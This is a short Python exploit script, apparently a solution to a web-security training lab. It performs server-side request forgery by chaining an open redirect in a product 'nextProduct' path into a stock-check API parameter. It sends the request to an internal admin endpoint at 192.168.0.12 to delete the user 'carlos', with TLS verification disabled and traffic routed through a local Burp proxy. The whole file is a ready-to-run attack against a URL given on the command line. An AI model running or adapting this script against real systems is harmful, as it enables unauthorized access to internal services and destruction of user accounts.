import requests
import urllib3
import sys

# disable the urllib3 warning hai
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# set up the burp proxy

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}



def delete_carlos(s,url):
    print("Deleting the carlos user.............")
     
    delete_user_carlos_payload='/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos'
    path=url + '/product/stock'
    params={'stockApi':delete_user_carlos_payload}
    # now we will be sending a post request
    requests=s.post(path,data=params,verify=False,proxies=proxies)
    res=requests.text
    print(res)
def main():
    if(len(sys.argv))!=2:
        print("[+]Usage %s <url>" % sys.argv[0])  
        print("[+]Example %s www.example.com" % sys.argv[0])  
    else:
        url=sys.argv[1]
        s=requests.Session()
        delete_carlos(s,url)




if __name__=="__main__":
    main() 